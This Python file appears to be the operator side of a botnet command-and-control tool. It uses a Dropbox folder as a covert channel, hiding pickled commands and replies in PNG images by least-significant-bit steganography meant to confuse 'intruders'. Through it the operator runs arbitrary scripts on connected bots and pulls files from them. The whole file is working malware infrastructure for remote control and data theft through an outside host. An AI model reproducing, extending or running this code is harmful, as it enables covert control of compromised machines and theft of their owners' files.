import io
import os
import pickle
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timedelta

import PIL.Image
import dropbox
import dropbox.exceptions
import dropbox.files

ENV_TOKEN = "DROPBOX_TOKEN"
ALIVE_DELAY = 30


@dataclass
class Command:
    id: int
    input: str
    output: str | None


@dataclass
class Message:
    sender: str
    time: datetime
    command: Command | None


def _encode_bytes(image, data):
    def _yield_bits(byte_array):
        # 1 bit of extra information (says whether the text continues or not), 8 bits of data (1 char)
        # also, the bit order is reversed to make the decoding a little more confusing for intruders
        for d in byte_array:
            yield 0
            for shift in range(8):
                yield (d >> shift) % 2
        yield 1

    # make every part of the pixel even (for bit == 0) and odd (for bit == 1)
    image = image.copy()
    bits = _yield_bits(data)
    pixels = list(image.getdata())
    width, height = image.size
    for i, p in enumerate(pixels):
        r, g, b = p[0], p[1], p[2]
        image.putpixel((i % width, i // width), (
            r // 2 * 2 + next(bits, r % 2),
            g // 2 * 2 + next(bits, g % 2),
            b // 2 * 2 + next(bits, b % 2),
        ))
        if i * 3 + 3 > len(data) * 9:
            break
    return image


def _decode_bytes(image):
    # read all bits
    bits = []
    pixels = list(image.getdata())
    for p in pixels:
        r, g, b = p[0], p[1], p[2]
        bits.append(r % 2)
        bits.append(g % 2)
        bits.append(b % 2)
        # stop when 9th bit is 1
        if len(bits) > 0 and bits[(len(bits) - 1) // 9 * 9] == 1:
            break
    # convert bits to byte array
    data = []
    tmp = 0
    curr = 8
    for b in bits:
        if curr == 8:
            if b == 1:
                break
            tmp = 0
            curr = 0
            continue
        if b == 1:
            tmp += 2 ** curr
        curr += 1
        if curr == 8:
            data.append(tmp)
    return bytes(data)


class Controller:
    _stop_flag = False

    def __init__(self, token: str):
        self.bots: list[str] = []  # bots alive, updated by _command_and_control
        self.commands: dict[str, Message] = {}  # commands to be sent
        self.outputs: dict[str, str] = {}  # output from bots
        self.lock: threading.Lock = threading.Lock()

        thread = threading.Thread(target=self._command_and_control, args=())
        thread.start()

        try:
            self._run_ui()
        except KeyboardInterrupt:
            pass

        # join threads
        self._stop_flag = True
        print("Waiting for threads to join")
        thread.join()

    def _command_and_control(self) -> None:
        while not self._stop_flag:
            new_bots = []

            with self.lock:
                commands = self.commands.copy()

            with dropbox.Dropbox(token) as dbx:
                try:
                    # list all files
                    res = dbx.files_list_folder("")
                    for entry in res.entries:
                        # check recently modified files
                        if datetime.utcnow() - entry.client_modified < timedelta(seconds=ALIVE_DELAY):
                            # try to decode message from the file
                            message = None
                            try:
                                md, res = dbx.files_download(entry.path_lower)
                                im = PIL.Image.open(io.BytesIO(res.content))
                                data = _decode_bytes(im)
                                message = pickle.loads(data)
                            except Exception:
                                continue  # not a bot file (or message is corrupted)
                            bot_name = entry.name[:-4]
                            if message.sender != "server":
                                if datetime.utcnow() - message.time < timedelta(seconds=ALIVE_DELAY):
                                    new_bots.append(bot_name)
                                if message.command is not None:
                                    with self.lock:
                                        if bot_name in self.commands:
                                            if self.commands[bot_name].time < message.time:
                                                self.outputs[bot_name] = message.command.output
                                                del self.commands[bot_name]
                                else:
                                    # command not sent yet, or it has been rewritten
                                    if bot_name in commands:
                                        # encode data to image and upload it to dropbox
                                        message = commands[bot_name]
                                        data = pickle.dumps(message)
                                        im = _encode_bytes(im, data)
                                        byteIO = io.BytesIO()
                                        im.save(byteIO, format='PNG')
                                        dbx.files_upload(byteIO.getvalue(), entry.path_lower, mode=dropbox.files.WriteMode('overwrite'))
                        if self._stop_flag:
                            return
                except dropbox.exceptions.AuthError:
                    pass
                except dropbox.exceptions.ApiError:
                    pass
            with self.lock:
                self.bots = new_bots
            time.sleep(2)

    def _run_ui(self):
        print("Waiting for bots to connect...")

        while True:
            with self.lock:
                bots = self.bots.copy()

            if len(bots) > 0:
                while True:
                    with self.lock:
                        bots = self.bots.copy()

                    if len(bots) == 0:
                        break

                    # select bot
                    print("\nThe following bots are available:")
                    for ind, bot in enumerate(bots):
                        print(f"[{ind}] {bot}")

                    inp = input("\nChoose bot to command: ")
                    try:
                        num = int(inp)
                        if num < 0 or num >= len(bots):
                            print(f"Enter a number between {0} and {len(bots) - 1}!")
                            continue
                    except ValueError:
                        print("Invalid number!")
                        continue

                    bot_name = bots[num]

                    # choose command
                    while True:
                        print("\nThe following commands are available:\n[0] Run script\n[1] Download file")
                        inp = input("\nChoose command to issue: ")
                        try:
                            num = int(inp)
                        except ValueError:
                            print("Invalid number!")
                            continue

                        match num:
                            case 0:
                                script_input = input("\nEnter the script to be run: ")
                                with self.lock:
                                    self.commands[bot_name] = Message(
                                        sender="server",
                                        time=datetime.utcnow(),
                                        command=Command(
                                            id=0,
                                            input=script_input,
                                            output=None,
                                        ),
                                    )
                                print("\nWaiting for command to be executed... (might take up to 15 seconds)")
                                while True:
                                    with self.lock:
                                        if bot_name in self.outputs:
                                            output = self.outputs[bot_name]
                                            del self.outputs[bot_name]
                                            print(f"\n> {script_input}\n{output}")
                                            break
                                    time.sleep(0.05)
                            case 1:
                                script_input = input("\nEnter the path to the file: ")
                                with self.lock:
                                    self.commands[bot_name] = Message(
                                        sender="server",
                                        time=datetime.utcnow(),
                                        command=Command(
                                            id=1,
                                            input=script_input,
                                            output=None,
                                        ),
                                    )
                                print("\nWaiting for the file to be transferred... (might take up to 20 seconds)")
                                while True:
                                    output = None
                                    with self.lock:
                                        if bot_name in self.outputs:
                                            output = self.outputs[bot_name]
                                            del self.outputs[bot_name]
                                            if output is None:
                                                print("\nCouldn't download the file! Either it doesn't exists or bot doesn't have permissions to read it.")
                                                break
                                    if output is not None:
                                        with dropbox.Dropbox(token) as dbx:
                                            try:
                                                md, res = dbx.files_download(output)
                                                filename = f"/tmp{output}"
                                                with open(filename, "wb") as f:
                                                    f.write(res.content)
                                                print(f"\nFile downloaded to {filename}")
                                            except dropbox.exceptions.AuthError:
                                                print("\ndropbox auth error")
                                            except dropbox.exceptions.ApiError:
                                                print("\ndropbox api error")
                                        break
                                    time.sleep(0.05)
                            case _:
                                print(f"Command {num} not available!")
                        break


if __name__ == "__main__":
    if ENV_TOKEN not in os.environ:
        raise EnvironmentError(f"{ENV_TOKEN} not set")
    token = os.environ[ENV_TOKEN]

    Controller(token)
